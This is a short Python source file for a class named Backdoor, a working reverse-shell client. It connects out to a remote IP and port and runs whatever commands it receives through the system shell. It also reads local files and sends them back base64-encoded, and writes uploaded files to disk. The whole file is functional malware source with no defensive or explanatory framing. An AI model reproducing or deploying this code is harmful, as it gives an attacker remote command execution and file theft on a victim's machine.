
import socket, json
import subprocess, os, base64

class Backdoor:
  
  def __init__(self, ip, port):
    self.ip = ip
    self.port = port
    self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.connection.connect((self.ip, self.port))

  def reliable_send(self, data):
    json_data = json.dumps(data)
    self.connection.send(json_data.encode())

  def realiable_recieve(self):
    json_data = ""
    while True:
      try:
        json_data = json_data + self.connection.recv(1024).decode("ascii")
        return json.loads(json_data)
      except ValueError:
        continue

  def change_directory(self, path):
    os.chdir(path)
    return ("[+] Changing directoy to " + path)

  def execute_system_command(self, command):
    return subprocess.check_output(command, shell=True)

  def read_file(self, path):
    with open(path, "rb") as file:
      return base64.b64encode(file.read())

  def write_file(self, path, content):
    with open(path, "wb") as file:
      file.write(base64.b64decode(content))
      return "[+] Upload successful."

  # RECIEVE DATA
  def run(self):
    while True:
      command = self.realiable_recieve()
      if command[0] == "exit":
        self.connection.close()
        exit()
      elif command[0] == "cd" and len(command) > 1:
        command_result = self.change_directory(command[1])
        self.reliable_send(command_result)
      # command_decoded = command.decode()
      # print(command)
      elif command[0] == "download" and len(command) > 1:
        command_result = self.read_file(command[1])
        self.reliable_send(command_result.decode("latin1"))
      elif command[0] == "upload" and len(command) > 1:
        command_result = self.write_file(command[1], command[2])
        self.reliable_send(command_result)
      else: 
        command_result = self.execute_system_command(command)
        self.reliable_send(command_result.decode("latin1"))
        # print(command_result)
        # SEND BACK DE COMMAND RESULT
      


